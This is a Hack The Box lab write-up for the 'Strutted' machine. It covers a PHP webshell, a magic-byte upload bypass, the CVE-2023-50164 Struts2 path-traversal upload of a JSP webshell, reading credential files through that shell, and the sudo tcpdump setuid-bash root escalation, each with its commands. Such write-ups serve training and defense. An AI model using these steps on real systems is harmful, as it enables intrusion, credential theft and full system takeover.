# Strutted HTB (Linux)

## Initial Setup

* Added the target IP and domain to `/etc/hosts` for local DNS resolution.

## Web Application Reconnaissance

* Navigated to the web page. Noted an **Upload File** functionality immediately.
* Checked DevTools (Inspect Element) — no obvious client-side filters or JavaScript validation interfering with uploads.
* The only other notable functionality was a **Download** button. Downloading the file provided a zip archive containing the Strutted application source code.
* Within the source:

  * Noticed a `tomcat-users.xml` file containing an admin username and password. Logged for potential use later.

## File Upload Testing

* Attempted to upload a basic PHP webshell:

  ```php
  <?php system($_REQUEST['cmd']); ?>
  ```

  * Upload rejected: *"not a jpg, jpeg, gif"*

* Renamed file to `shell.php.jpg`

  * Upload rejected: *"not an actual image"*
  * This suggested magic byte validation.

### Bypassing Magic Byte Checks

* Created a dummy image:

  ```bash
  convert -size 100x100 xc:white image.jpg
  cat image.jpg shell.php.jpg > sh.php.jpg
  ```

  * Upload succeeded, received a shareable link.
  * Share link was dead, but inspecting the page source revealed the image upload path:

  ```
  http://strutted.htb/uploads/20250708_012649/sh.php.jpg
  ```

* Appending `?cmd=id` to this URL did not trigger command execution, confirming the server doesn’t interpret `.php.jpg` as executable.

## Understanding the Application Stack

* Re-examined the downloaded source and `pom.xml`

* Noted:

  ```xml
  <struts2.version>6.3.0.1</struts2.version>
  ```

* Realized this is a **JSP-based Java Struts2 application** — which explained why PHP payloads failed.

## Vulnerability Research

* Identified **CVE-2023-50164**:

  * Vulnerability in Struts2 FileUploadInterceptor allowing **path traversal via manipulated multipart parameters**, potentially leading to RCE if a file can be written to a web-accessible directory.
  * Relevant resource:

    * [https://nvd.nist.gov/vuln/detail/CVE-2023-50164](https://nvd.nist.gov/vuln/detail/CVE-2023-50164)

## Exploitation via CVE-2023-50164

* Prepared a JSP webshell using:

  [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp)

* Within BurpSuite Repeater:

  * Uploaded an image to satisfy magic byte checks.
  * Immediately after image bytes, appended the JSP webshell.
  * Crafted multipart parameter `top.uploadFileName` to perform directory traversal:

  ```
  Content-Disposition: form-data; name="top.uploadFileName"

  ../../cmd.jsp
  ```

* Closed multipart form data.

https://ibb.co/gZxXbskG

https://ibb.co/TqvDYXzk

* Server response showed upload succeeded, displaying path:

  ```
  uploads/20250708_023045/../../cmd.jsp
  ```

https://ibb.co/S4vcjF6N


* Confirmed the webshell was accessible and operational:

  ```
  http://strutted.htb/uploads/20250708_023045/../../cmd.jsp
  ```

## Enumeration through Webshell

* Ran:

  ```
  cat /etc/passwd
  ```

* Discovered a user:

  ```
  james:x:1000:1000:Network Administrator:/home/james:/bin/bash
  ```

* Attempted to locate any sensitive configuration files:

  * Noted earlier from the downloaded source the existence of `/etc/tomcat9/tomcat-users.xml`
  * Unable to `cat` directly via shell (possible restrictions), so used `curl` through the webshell:

  ```
  curl http://strutted.htb/cmd.jsp?cmd=cat+%2Fetc%2Ftomcat9%2Ftomcat-users.xml --output tomcat-users.xml
  ```

* Retrieved the file, revealed admin credentials.

## SSH Access

* Using the discovered password for **user james**, successfully connected via SSH:

  ```
  ssh james@10.10.11.59
  ```

## Privilege Escalation

* Checked sudo privileges:

  ```
  sudo -l
  ```

* Output:

  ```
  User james may run the following commands on localhost:
      (ALL) NOPASSWD: /usr/sbin/tcpdump
  ```

### Exploiting `tcpdump` via GTFOBins

* Referenced GTFOBins technique:
  [https://gtfobins.github.io/gtfobins/tcpdump/#sudo](https://gtfobins.github.io/gtfobins/tcpdump/#sudo)

* Executed:

  ```bash
  COMMAND='cp /bin/bash /tmp/bash && chmod +s /tmp/bash'
  TF=$(mktemp)
  echo "$COMMAND" > $TF
  chmod +x $TF
  sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
  /tmp/bash -p
  ```

* Spawned a root shell via setuid `bash`.

## Root Flag

* Retrieved the root flag:

  ```
  cat /root/root.txt
  ```

## Summary

| Step                        | Action                                                  |
| :-------------------------- | :------------------------------------------------------ |
| Initial recon               | Found upload functionality and downloaded application   |
| Application stack discovery | Identified Struts2 + JSP usage and vulnerable version   |
| Exploitation                | CVE-2023-50164 — file upload path traversal to webshell |
| Lateral movement            | Retrieved tomcat-users.xml via webshell curl            |
| Privilege escalation        | SSH access as **james** → sudo `tcpdump` → root shell   |
| Root flag retrieval         | Read `/root/root.txt`                                   |

